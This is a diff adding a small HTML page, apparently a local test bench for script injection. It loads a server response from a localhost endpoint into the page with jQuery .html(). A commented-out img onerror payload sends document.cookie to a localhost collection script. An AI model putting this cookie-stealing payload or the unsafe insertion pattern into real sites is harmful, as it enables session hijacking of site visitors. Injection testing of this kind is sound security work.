@@ -1,0 +1,34 @@
+<head>
+<script src="jquery.js"></script>
+</head>
+<body>
+</body>
+<script defer>
+	var xhr;
+	try {
+		xhr = new window.XMLHttpRequest();
+	} catch (e) {
+		xhr = null;
+	}
+	xhr.onreadystatechange = function() {
+		if (xhr.readyState === 4) {
+			//document.body.innerHTML = xhr.response;
+			//$(xhr.response).appendTo(document.body);
+			$(document.body).html(xhr.response);
+            //$(document.body).text(xhr.response);
+		}
+	}
+	xhr.open("POST", "http://127.0.0.1/inject/injected_data.php");
+	xhr.send();
+	/*document.body.innerHTML = `<img src='x' onerror='(function() {
+			var result;
+			try {
+				result = new window.XMLHttpRequest();
+			} catch (e) {
+				result = null;
+			}
+			result.open("POST", "http://127.0.0.1/inject/post_save.php?data=" + escape(document.cookie));
+			result.send();
+		})()'
+	>`;*/
+</script>
